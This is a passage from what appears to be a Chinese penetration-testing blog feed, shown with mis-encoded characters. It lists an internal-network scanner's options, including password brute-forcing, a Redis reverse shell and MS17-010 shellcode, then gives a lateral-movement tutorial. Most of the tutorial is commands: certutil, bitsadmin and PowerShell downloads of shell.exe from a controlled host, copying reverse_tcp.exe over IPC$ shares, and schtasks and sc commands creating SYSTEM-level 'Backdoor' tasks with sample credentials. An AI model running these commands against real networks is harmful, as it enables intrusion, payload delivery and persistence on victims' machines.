(Bæ®µæ‰«æ)<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ‰«æè¯•äº†ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151445875.png" alt="image-20240419191600603"></p><p>ä»–è¿˜ä¼šè‡ªåŠ¨å»æµ‹è¯•å¼€æ”¾ç«¯å£çš„æœåŠ¡ä»¥åŠå°è¯•ä¸€äº›payloadï¼Œä¸è¿‡å…¨éƒ¨æ‰«é¢å°±ä¼šæ¯”è¾ƒè€—æ—¶ï¼Œå¯ä»¥é…åˆä¸€äº›å‚æ•°é€‚å½“è·³è¿‡ï¼Œè¿™é‡Œè´´ä¸€ä¸‹å…¨éƒ¨å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-c string<br>      sshå‘½ä»¤æ‰§è¡Œ<br>-cookie string<br>      è®¾ç½®cookie<br>-debug int<br>      å¤šä¹…æ²¡å“åº”,å°±æ‰“å°å½“å‰è¿›åº¦(default 60)<br>-domain string<br>      smbçˆ†ç ´æ¨¡å—æ—¶,è®¾ç½®åŸŸå<br>-h string<br>      ç›®æ ‡ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12<br>-hf string<br>      è¯»å–æ–‡ä»¶ä¸­çš„ç›®æ ‡<br>-hn string<br>      æ‰«ææ—¶,è¦è·³è¿‡çš„ip: -hn 192.168.1.1/24<br>-m string<br>      è®¾ç½®æ‰«ææ¨¡å¼: -m ssh (default &quot;all&quot;)<br>-no<br>      æ‰«æç»“æœä¸ä¿å­˜åˆ°æ–‡ä»¶ä¸­<br>-nobr<br>      è·³è¿‡sqlã€ftpã€sshç­‰çš„å¯†ç çˆ†ç ´<br>-nopoc<br>      è·³è¿‡web pocæ‰«æ<br>-np<br>      è·³è¿‡å­˜æ´»æ¢æµ‹<br>-num int<br>      web poc å‘åŒ…é€Ÿç‡  (default 20)<br>-o string<br>      æ‰«æç»“æœä¿å­˜åˆ°å“ª (default &quot;result.txt&quot;)<br>-p string<br>      è®¾ç½®æ‰«æçš„ç«¯å£: 22 | 1-65535 | 22,80,3306 (default &quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;)<br>-pa string<br>      æ–°å¢éœ€è¦æ‰«æçš„ç«¯å£,-pa 3389 (ä¼šåœ¨åŸæœ‰ç«¯å£åˆ—è¡¨åŸºç¡€ä¸Š,æ–°å¢è¯¥ç«¯å£)<br>-path string<br>      fcgiã€smb romote file path<br>-ping<br>      ä½¿ç”¨pingä»£æ›¿icmpè¿›è¡Œå­˜æ´»æ¢æµ‹<br>-pn string<br>      æ‰«ææ—¶è¦è·³è¿‡çš„ç«¯å£,as: -pn 445<br>-pocname string<br>      æŒ‡å®šweb pocçš„æ¨¡ç³Šåå­—, -pocname weblogic<br>-proxy string<br>      è®¾ç½®ä»£ç†, -proxy http://127.0.0.1:8080<br>-user string<br>      æŒ‡å®šçˆ†ç ´æ—¶çš„ç”¨æˆ·å<br>-userf string<br>      æŒ‡å®šçˆ†ç ´æ—¶çš„ç”¨æˆ·åæ–‡ä»¶<br>-pwd string<br>      æŒ‡å®šçˆ†ç ´æ—¶çš„å¯†ç <br>-pwdf string<br>      æŒ‡å®šçˆ†ç ´æ—¶çš„å¯†ç æ–‡ä»¶<br>-rf string<br>      æŒ‡å®šrediså†™å…¬é’¥ç”¨æ¨¡å—çš„æ–‡ä»¶ (as: -rf id_rsa.pub)<br>-rs string<br>      redisè®¡åˆ’ä»»åŠ¡åå¼¹shellçš„ipç«¯å£ (as: -rs 192.168.1.1:6666)<br>-silent<br>      é™é»˜æ‰«æ,é€‚åˆcsæ‰«ææ—¶ä¸å›æ˜¾<br>-sshkey string<br>      sshè¿æ¥æ—¶,æŒ‡å®šsshç§é’¥<br>-t int<br>      æ‰«æçº¿ç¨‹ (default 600)<br>-time int<br>      ç«¯å£æ‰«æè¶…æ—¶æ—¶é—´ (default 3)<br>-u string<br>      æŒ‡å®šUrlæ‰«æ<br>-uf string<br>      æŒ‡å®šUrlæ–‡ä»¶æ‰«æ<br>-wt int<br>      webè®¿é—®è¶…æ—¶æ—¶é—´ (default 5)<br>-pocpath string<br>      æŒ‡å®špocè·¯å¾„<br>-usera string<br>      åœ¨åŸæœ‰ç”¨æˆ·å­—å…¸åŸºç¡€ä¸Š,æ–°å¢æ–°ç”¨æˆ·<br>-pwda string<br>      åœ¨åŸæœ‰å¯†ç å­—å…¸åŸºç¡€ä¸Š,å¢åŠ æ–°å¯†ç <br>-socks5<br>      æŒ‡å®šsocks5ä»£ç† (as: -socks5  socks5://127.0.0.1:1080)<br>-sc <br>      æŒ‡å®šms17010åˆ©ç”¨æ¨¡å—shellcode,å†…ç½®æ·»åŠ ç”¨æˆ·ç­‰åŠŸèƒ½ (as: -sc add)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€ä½“ç³»å»ºè®¾-å†…ç½‘æ¨ªå‘ç§»åŠ¨</title>
      <link href="/2024/04/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2024/04/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¨ªå‘ç§»åŠ¨ä¸­çš„æ–‡ä»¶ä¼ è¾“"><a href="#æ¨ªå‘ç§»åŠ¨ä¸­çš„æ–‡ä»¶ä¼ è¾“" class="headerlink" title="æ¨ªå‘ç§»åŠ¨ä¸­çš„æ–‡ä»¶ä¼ è¾“"></a>æ¨ªå‘ç§»åŠ¨ä¸­çš„æ–‡ä»¶ä¼ è¾“</h1><p>åˆ¶å®šæ–‡ä»¶ä¼ è¾“çš„æ–¹æ¡ˆï¼Œä»¥ä¾¿åœ¨åç»­æ“ä½œè¿‡ç¨‹å‘æ”»å‡»ç›®æ ‡éƒ¨ç½²æ”»å‡»è½½è·æˆ–å…¶ä»–æ–‡ä»¶ã€‚</p><h2 id="é€šè¿‡ç½‘ç»œå…±äº«"><a href="#é€šè¿‡ç½‘ç»œå…±äº«" class="headerlink" title="é€šè¿‡ç½‘ç»œå…±äº«"></a>é€šè¿‡ç½‘ç»œå…±äº«</h2><p>Windows ç³»ç»Ÿä¸­çš„ç½‘ç»œå…±äº«åŠŸèƒ½å¯ä»¥å®ç°å±€åŸŸç½‘ä¹‹é—´çš„æ–‡ä»¶å…±äº«ã€‚é€šè¿‡æä¾›æœ‰æ•ˆçš„ç”¨æˆ·å‡­æ®ï¼Œç”¨æˆ·å¯ä»¥å¾ˆè½»æ¾åœ°å°†æ–‡ä»¶ä»ä¸€å°æœºå™¨ä¼ è¾“åˆ°å¦ä¸€å°æœºå™¨ã€‚</p><p>æ‰§è¡Œ<strong>net share</strong>å‘½ä»¤å¯ä»¥æŸ¥çœ‹Windowsç³»ç»Ÿé»˜è®¤å¼€å¯çš„ç½‘ç»œå…±äº«</p><p><img src="http://cdn.clown2024.cn/202407151448981.png" alt="image-20240411004232276"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C$ï¼šCç›˜å…±äº«<br>D$ï¼šDç›˜å…±äº«<br>...ä¾æ¬¡ç±»æ¨<br><br>ADMIN$ï¼šç³»ç»Ÿç›®å½•å…±äº«<br><br>IPC$(Internet Process Connection)ï¼šæ˜¯å…±äº«â€œå‘½åç®¡é“â€çš„èµ„æºï¼Œä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œé€šè¿‡æä¾›å¯ä¿¡ä»»çš„ç”¨æˆ·åå’Œå£ä»¤ï¼Œè¿æ¥åŒæ–¹å¯ä»¥å»ºç«‹å®‰å…¨çš„é€šé“å¹¶ä»¥æ­¤é€šé“è¿›è¡ŒåŠ å¯†æ•°æ®çš„äº¤æ¢ï¼Œä»è€Œå®ç°å¯¹è¿œç¨‹è®¡ç®—æœºçš„è®¿é—®ã€‚<br></code></pre></td></tr></table></figure><p>è€Œå®æˆ˜ä¸­å¾€å¾€ä¼šå»ºç«‹IPC$è¿æ¥ã€‚å› ä¸ºé€šè¿‡IPC$è¿æ¥ï¼Œä¸ä»…å¯ä»¥è¿›è¡Œæ‰€æœ‰æ–‡ä»¶å…±äº«æ“ä½œï¼Œè¿˜å¯ä»¥å®ç°å…¶ä»–è¿œç¨‹ç®¡ç†æ“ä½œï¼Œå¦‚åˆ—å‡ºè¿œç¨‹ä¸»æœºè¿›ç¨‹ã€åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºè®¡åˆ’ä»»åŠ¡æˆ–ç³»ç»ŸæœåŠ¡ç­‰ã€‚</p><p>å»ºç«‹IPC$è¿æ¥è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ol><li>è¿œç¨‹ä¸»æœºå¼€å¯äº†IPCè¿æ¥</li><li>è¿œç¨‹ä¸»æœºçš„139ç«¯å£å’Œ445ç«¯å£å¼€æ”¾</li></ol><p>æ‰§è¡Œä¸‹åˆ—å‘½ä»¤ä¸è¿œç¨‹ä¸»æœºå»ºç«‹IPCè¿æ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use \\&lt;IP/Hostname&gt;\IPC$ &lt;Password&gt; /user:&lt;Username&gt;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æ‰§è¡Œä¸‹åˆ—å‘½ä»¤å¯ä»¥åˆ—å‡ºCç›˜å…±äº«ç›®å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">dir \\&lt;IP&gt;\C$<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<strong>copy</strong>å‘½ä»¤å¯ä»¥é€šè¿‡å…±äº«è¿æ¥å‘è¿œç¨‹ä¸»æœºä¸Šå¤åˆ¶æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥å°†è¿œç¨‹ä¸»æœºä¸Šçš„æ–‡ä»¶å¤åˆ¶åˆ°æœ¬åœ°ï¼Œä½†éœ€è¦æ³¨æ„å½“å‰ç”¨æˆ·å¯¹è¿œç¨‹ç›®å½•çš„æƒé™ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">copy .\reverse_tcp.exe \\&lt;ip&gt;\C$<br></code></pre></td></tr></table></figure><p>å»ºç«‹å…¶ä»–å…±äº«è¿æ¥ä¹Ÿç±»ä¼¼ï¼Œä¾‹å¦‚C$ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net use \\&lt;IP/Hostname&gt;\C$ &lt;Password&gt; /user:&lt;Username&gt;<br></code></pre></td></tr></table></figure><h2 id="æ­å»ºsmbæœåŠ¡å™¨"><a href="#æ­å»ºSMBæœåŠ¡å™¨" class="headerlink" title="æ­å»ºSMBæœåŠ¡å™¨"></a>æ­å»ºSMBæœåŠ¡å™¨</h2><p>SMB(Server Message Blockï¼ŒæœåŠ¡å™¨æ¶ˆæ¯å—)ï¼Œåˆç§° CIFS(Common Internet FileSystemï¼Œç½‘ç»œæ–‡ä»¶å…±äº«ç³»ç»Ÿ)ï¼Œç”±å¾®è½¯å¼€å‘ï¼ŒåŸºäºåº”ç”¨å±‚ç½‘ç»œä¼ è¾“åè®®ï¼Œä¸»è¦åŠŸèƒ½æ˜¯ä½¿ç½‘ç»œä¸Šçš„è®¡ç®—æœºèƒ½å¤Ÿå…±äº«è®¡ç®—æœºæ–‡ä»¶ã€æ‰“å°æœºã€ä¸²è¡Œç«¯å£å’Œé€šæ–°ç­‰èµ„æºã€‚SMB æ¶ˆæ¯ä¸€èˆ¬ä½¿ç”¨ NetBIOS åè®®æˆ– TCP å‘é€ï¼Œåˆ†åˆ«ä½¿ç”¨ç«¯å£ 139 æˆ– 445ï¼Œç›®å‰å€¾å‘äºä½¿ç”¨ 445 ç«¯å£ã€‚</p><p>å®æˆ˜ä¸­å¯ä»¥åœ¨æµ‹è¯•äººå‘˜è‡ªå·±çš„æœåŠ¡å™¨æˆ–å½“å‰æ‰€æ§å†…ç½‘ä¸»æœºä¸Šæ­å»º SMB æœåŠ¡å™¨,å°†éœ€è¦æ¨ªå‘ä¼ è¾“çš„æ–‡ä»¶å¦‚æ”»å‡»è½½è·ç­‰æ”¾å…¥ SMB æœåŠ¡å™¨çš„å…±äº«ç›®å½•ï¼Œå¹¶æŒ‡å®šUNCè·¯å¾„ï¼Œè®©æ¨ªå‘ç§»åŠ¨çš„ç›®æ ‡ä¸»æœºè¿œç¨‹åŠ è½½ SMB å…±äº«çš„æ–‡ä»¶ã€‚æ³¨æ„ï¼Œéœ€ä½¿ç”¨ SMB åŒ¿åå…±äº«ï¼Œå¹¶ä¸”æ­å»ºçš„SMBæœåŠ¡å™¨èƒ½å¤Ÿè¢«æ¨ªå‘ç§»åŠ¨çš„ç›®æ ‡æ‰€è®¿é—®åˆ°ã€‚</p><p>åœ¨Linuxä¸Šå¯ä»¥ä½¿ç”¨Impacketé¡¹ç›®çš„smbserver.pyæ¥æ­å»ºSMBæœåŠ¡å™¨</p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤æ­å»ºä¸€ä¸ªåä¸ºevilsmbï¼Œå…±äº«ç›®å½•æŒ‡å‘&#x2F;root&#x2F;shareçš„SMBåŒ¿åå…±äº«</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mkdir /root/share<br>python smbserver.py evilsmb /root/share -smb2support<br></code></pre></td></tr></table></figure><p>åœ¨Windowsä¸Šå¦‚æœè·å¾—ç®¡ç†å‘˜æƒé™å¯ä»¥æ‰‹åŠ¨é…ç½®SMBåŒ¿åå…±äº«ï¼Œä¹Ÿå¯ä»¥é€šè¿‡Invoke-BuildAnonymousSMBServerå¿«é€Ÿæ­å»ºï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></p><h2 id="é€šè¿‡windowsè‡ªå¸¦å·¥å…·"><a href="#é€šè¿‡Windowsè‡ªå¸¦å·¥å…·" class="headerlink" title="é€šè¿‡Windowsè‡ªå¸¦å·¥å…·"></a>é€šè¿‡Windowsè‡ªå¸¦å·¥å…·</h2><p><strong>Certutil</strong></p><p>Certutil æ˜¯ Windows è‡ªå¸¦çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºç®¡ç† Windows è¯ä¹¦å¹¶ä½œä¸ºè¯ä¹¦æœåŠ¡çš„ä¸€éƒ¨åˆ†å®‰è£…ã€‚Certutilæä¾›äº†ä»ç½‘ç»œä¸­ä¸‹è½½æ–‡ä»¶çš„åŠŸèƒ½ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡ŒCertutilå‘½ä»¤ï¼Œæ§åˆ¶å…¶ä¸‹è½½é¢„å…ˆéƒ¨ç½²åœ¨å¯æ§æœåŠ¡å™¨ä¸Šçš„æ¶æ„æ–‡ä»¶ï¼Œå¦‚æ”»å‡»è½½è·ç­‰ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">certutil -urlcache -split -f http://IP:Port/shell.exe C:\reverse_tcp.exe<br></code></pre></td></tr></table></figure><p>é€šè¿‡certutilä¸‹è½½shell.phpï¼Œå¹¶ä¿å­˜ä¸ºreverse_tcp.exe</p><p><strong>BITSAdmin</strong></p><p>è¿™æ˜¯Windows7ä¹‹åè‡ªå¸¦çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥ç”¨äºæ–‡ä»¶ä¸Šä¼ ä¸‹è½½ã€ç›‘æ§ä¸Šä¼ è¿›åº¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">bitsadmin /transfer test http://ip:port//shell.exe C:\reverse_tcp.exe<br><span class="hljs-meta prompt_">#</span><span class="language-bash">åˆ›å»ºä¸€ä¸ªåä¸º<span class="hljs-built_in">test</span>çš„ä¸‹è½½ä»»åŠ¡ï¼Œå°†shell.exeä¸‹è½½åˆ°æœ¬åœ°</span><br></code></pre></td></tr></table></figure><p><strong>PowerShell</strong></p><p>å¯ä»¥é€šè¿‡åˆ›å»ºWebClientå¯¹è±¡æ¥å®ç°æ–‡ä»¶ä¸‹è½½</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">(New-Object Net.WebClient).DownloadFile(&quot;http://ip:port/shell.exe&quot;,&quot;C:\reverse_tcp.exe&quot;)<br></code></pre></td></tr></table></figure><h1 id="åˆ›å»ºè®¡åˆ’ä»»åŠ¡"><a href="#åˆ›å»ºè®¡åˆ’ä»»åŠ¡" class="headerlink" title="åˆ›å»ºè®¡åˆ’ä»»åŠ¡"></a>åˆ›å»ºè®¡åˆ’ä»»åŠ¡</h1><h2 id="å¸¸è§„åˆ©ç”¨æµç¨‹"><a href="#å¸¸è§„åˆ©ç”¨æµç¨‹" class="headerlink" title="å¸¸è§„åˆ©ç”¨æµç¨‹"></a>å¸¸è§„åˆ©ç”¨æµç¨‹</h2><p>åˆ›å»ºIPCè¿æ¥ä¹‹åï¼Œå¯ä»¥åœ¨è¿œç¨‹ä¸»æœºåˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼›åœ¨æ‹¥æœ‰å¯¹æ–¹ç®¡ç†å‘˜å‡­æ®çš„æƒ…å†µä¸‹å¯ä»¥å®ç°æ¨ªå‘ç§»åŠ¨</p><p>å…·ä½“æ“ä½œæµç¨‹å¦‚ä¸‹ï¼š</p><ol><li><p>åˆ©ç”¨å·²å»ºç«‹çš„å…±äº«è¿æ¥å‘ä¸»æœºä¸Šä¼ æ”»å‡»è½½è·</p></li><li><p>åˆ©ç”¨å·²å»ºç«‹çš„IPCè¿æ¥æˆ–æŒ‡å®šç”¨æˆ·å‡­æ®çš„æ–¹å¼åœ¨è¿œç¨‹ä¸»æœºåˆ›å»ºè®¡åˆ’ä»»åŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR reverse_tcp.exe /RU System /F<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/S,æŒ‡å®šè¦è¿æ¥çš„ç³»ç»Ÿï¼›/TNï¼ŒæŒ‡è¦åˆ›å»ºçš„è®¡åˆ’ä»»åŠ¡çš„åç§°ï¼›/SCï¼ŒæŒ‡è®¡åˆ’ä»»åŠ¡æ‰§è¡Œçš„é¢‘ç‡</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">/MOï¼Œè®¡åˆ’ä»»åŠ¡æ‰§è¡Œçš„å‘¨æœŸï¼›/TRï¼Œæ‰§è¡Œçš„ç¨‹åºè·¯å¾„ï¼›/RUï¼Œè®¡åˆ’ä»»åŠ¡æ‰§è¡Œçš„ç³»ç»Ÿæƒé™ï¼›</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">/Fï¼Œè‹¥ä»»åŠ¡å·²å­˜åœ¨åˆ™å¼ºåˆ¶åˆ›å»º</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡ç”¨å»ºç«‹IPCè¿æ¥ï¼Œéœ€è¦æ‰‹åŠ¨æŒ‡å®šç”¨æˆ·å‡­æ®</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR reverse_tcp.exe /RU System /F /U Administrator /P Admin@123<br></code></pre></td></tr></table></figure></li><li><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤å¯åŠ¨è®¡åˆ’ä»»åŠ¡,ä¹Ÿå¯ä»¥ç­‰å¾…è®¡åˆ’ä»»åŠ¡è‡ªå·±å¯åŠ¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /RUN /S 10.10.10.19 /I /TN Backdoor<br></code></pre></td></tr></table></figure></li><li><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤åˆ é™¤è®¡åˆ’ä»»åŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Delete /S 10.10.10.19 /TN Backdoor /F<br></code></pre></td></tr></table></figure></li></ol><p>è¿˜å¯ä»¥é€šè¿‡å†™è®¡åˆ’ä»»åŠ¡æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶å°†ç»“æœå†™å…¥æ–‡ä»¶ä¿å­˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe /c &#x27;whoami &gt; C:\result.txt&#x27;&quot; /RU System /F<br></code></pre></td></tr></table></figure><h2 id="uncè·¯å¾„åŠ è½½æ‰§è¡Œ"><a href="#UNCè·¯å¾„åŠ è½½æ‰§è¡Œ" class="headerlink" title="UNCè·¯å¾„åŠ è½½æ‰§è¡Œ"></a>UNCè·¯å¾„åŠ è½½æ‰§è¡Œ</h2><p>Windowsä¸­ä½¿ç”¨UNCè·¯å¾„æ¥è®¿é—®å…±äº«èµ„æºï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">\\servername\sharename\directory\filename<br></code></pre></td></tr></table></figure><blockquote><p>servernameä¸ºä¸»æœºåï¼Œsharenameä¸ºç½‘ç»œå…±äº«åç§°ï¼Œdirectoryå’Œfilenameä¸ºå…±äº«ä¸‹çš„ç›®å½•å’Œåç§°</p></blockquote><p>é€šè¿‡è¯¥æ–¹æ³•å¯ä»¥çœå»ä¸Šä¼ æ”»å‡»è½½è·çš„æ­¥éª¤ï¼Œç›´æ¥ç”¨UNCè·¯å¾„ä»£æ›¿æœ¬åœ°è·¯å¾„ï¼Œè®©è¿œç¨‹ä¸»æœºç›´æ¥åŠ è½½æµ‹è¯•äººå‘˜æ­å»ºçš„SMBåŒ¿åæœåŠ¡å™¨ä¸Šçš„å…±äº«ç›®å½•ä¸‹çš„æ”»å‡»è½½è·</p><p>è¿™é‡Œä»¥åˆ›å»ºè®¡åˆ’ä»»åŠ¡ç¤ºä¾‹ï¼Œåˆ›å»ºå…¶ä»–ä»»åŠ¡æ¥åŠ è½½æ–‡ä»¶çš„å½¢å¼ä¸€æ ·</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR \\192.168.2.143\evilsmb\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨ç³»ç»ŸæœåŠ¡"><a href="#åˆ©ç”¨ç³»ç»ŸæœåŠ¡" class="headerlink" title="åˆ©ç”¨ç³»ç»ŸæœåŠ¡"></a>åˆ©ç”¨ç³»ç»ŸæœåŠ¡</h1><h2 id="åˆ›å»ºè¿œç¨‹æœåŠ¡"><a href="#åˆ›å»ºè¿œç¨‹æœåŠ¡" class="headerlink" title="åˆ›å»ºè¿œç¨‹æœåŠ¡"></a>åˆ›å»ºè¿œç¨‹æœåŠ¡</h2><p>é™¤äº†åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œæµ‹è¯•äººå‘˜è¿˜å¯ä»¥é€šè¿‡åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºç³»ç»ŸæœåŠ¡çš„æ–¹å¼ï¼Œåœ¨è¿œç¨‹ä¸»æœºä¸Šè¿è¡ŒæŒ‡å®šçš„ç¨‹åºæˆ–å‘½ä»¤ã€‚è¯¥æ–¹å¼éœ€è¦æ‹¥æœ‰ä¸¤ç«¯ä¸»æœºçš„ç®¡ç†å‘˜æƒé™å’ŒIPC$è¿æ¥ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š</p><ol><li><p>åˆ©ç”¨å·²å»ºç«‹çš„å…±äº«è¿æ¥ä¸Šä¼ æ”»å‡»è½½è·</p></li><li><p>åˆ©ç”¨å·²å»ºç«‹çš„IPCè¿æ¥åˆ›å»ºç³»ç»Ÿä»»åŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc \\10.10.10.19 create Backdoor binpath= &quot;cmd.exe /k C:\reverse_tcp.exe&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">binpathï¼ŒæŒ‡å®šæœåŠ¡å¯åŠ¨æ—¶è¿è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œ<span class="hljs-string">&quot;=&quot;</span>åé¢æœ‰ä¸€ä¸ªç©ºæ ¼</span><br></code></pre></td></tr></table></figure></li><li><p>å¯åŠ¨è¯¥æœåŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc \\10.10.10.19 start Backdoor<br></code></pre></td></tr></table></figure></li><li><p>æ”»å‡»æˆåŠŸåï¼Œåˆ é™¤åˆ›å»ºçš„ä»»åŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc \\10.10.10.19 delete Backdoor<br></code></pre></td></tr></table></figure></li></ol><h2 id="scshell"><a href="#SCShell" class="headerlink" title="SCShell"></a>SCShell</h2><p>SCShellæ˜¯ä¸€æ¬¾åˆ©ç”¨ç³»ç»ŸæœåŠ¡çš„æ— æ–‡ä»¶æ¨ªå‘ç§»åŠ¨å·¥å…·ã€‚</p><p>è·Ÿä¼ ç»Ÿåˆ›å»ºç³»ç»Ÿä»»åŠ¡ä¸åŒçš„æ˜¯ï¼ŒSCShell åˆ©ç”¨æä¾›çš„ç”¨æˆ·å‡­æ®ï¼Œé€šè¿‡ChangeServiceConfigA APIä¿®æ”¹è¿œç¨‹ä¸»æœºä¸Šçš„æœåŠ¡é…ç½®ï¼Œå°†æœåŠ¡çš„äºŒè¿›åˆ¶è·¯å¾„åä¿®æ”¹ä¸ºæŒ‡å®šçš„ç¨‹åºæˆ–æ”»å‡»è½½è·ï¼Œç„¶åé‡å¯æœåŠ¡ã€‚æ‰§è¡Œç»“æŸåï¼ŒæœåŠ¡äºŒè¿›åˆ¶è·¯å¾„å°†æ¢å¤ä¸ºåŸå§‹è·¯å¾„</p><p>SCShell éœ€è¦æä¾›è¿œç¨‹ä¸»æœºçš„ç®¡ç†å‘˜æƒé™ç”¨æˆ·çš„å‡­æ®ï¼Œå¹¶ä¸”éœ€è¦å·²çŸ¥è¿œç¨‹ä¸»æœºä¸Šçš„ç³»ç»ŸæœåŠ¡åç§°ã€‚æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SCShell.exe 10.10.10.19 XblAuthManager &quot;C:\Windows\System32\cmd.exe /c calc&quot; hacke-my.com Administrator Admin@123<br><span class="hljs-meta prompt_"># </span><span class="language-bash">SCShell.exe &lt;target&gt; &lt;Service Name&gt; &lt;Payload&gt; &lt;Username&gt; &lt;Password&gt;</span><br></code></pre></td></tr></table></figure><h2 id="uac-remote-restrictions"><a href="#UAC-Remote-Restrictions" class="headerlink" title="UAC Remote Restrictions"></a>UAC Remote Restrictions</h2><p>ä¸ºäº†æ›´å¥½åœ°ä¿æŠ¤å±äºæœ¬åœ°ç®¡ç†å‘˜ç»„æˆå‘˜çš„ç”¨æˆ·ï¼Œå¾®è½¯åœ¨ Windows Vista ä»¥åçš„æ“ä½œç³»ç»Ÿä¸­å¼•å…¥äº† UACRemote Restrictions(è¿œç¨‹é™åˆ¶)ã€‚æ­¤æœºåˆ¶æœ‰åŠ©äºé˜²æ­¢æœ¬åœ°æ¶æ„è½¯ä»¶ä»¥ç®¡ç†æƒé™è¿œç¨‹è¿è¡Œã€‚</p><p>å› æ­¤ï¼Œå¦‚æœæµ‹è¯•äººå‘˜ä½¿ç”¨è®¡ç®—æœºæœ¬åœ°ç”¨æˆ·è¿›è¡Œéœ€è¦ç®¡ç†å‘˜æƒé™çš„è¿œç¨‹ç®¡ç†æ“ä½œï¼Œæ— è®ºæ˜¯schtasksè¿˜æ˜¯PsExecã€WMIã€WinRMã€å“ˆå¸Œä¼ é€’æ”»å‡»ç­‰ï¼Œéƒ½åªèƒ½ä½¿ç”¨RID 500çš„æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·æ‰è¡Œï¼Œä½¿ç”¨å…¶ä»–ä»»ä½•ç”¨æˆ·åŒ…æ‹¬éRID 500ç”¨æˆ·éƒ½ä¼šæç¤º<strong>æ‹’ç»è®¿é—®</strong>ã€‚</p><p>æ³¨æ„ï¼ŒUAC Remote Restrictionsåªé™åˆ¶æœ¬åœ°ç”¨æˆ·ï¼ŒåŸŸç®¡ç†å‘˜ç”¨æˆ·ä¸å—é™åˆ¶ï¼Œå› 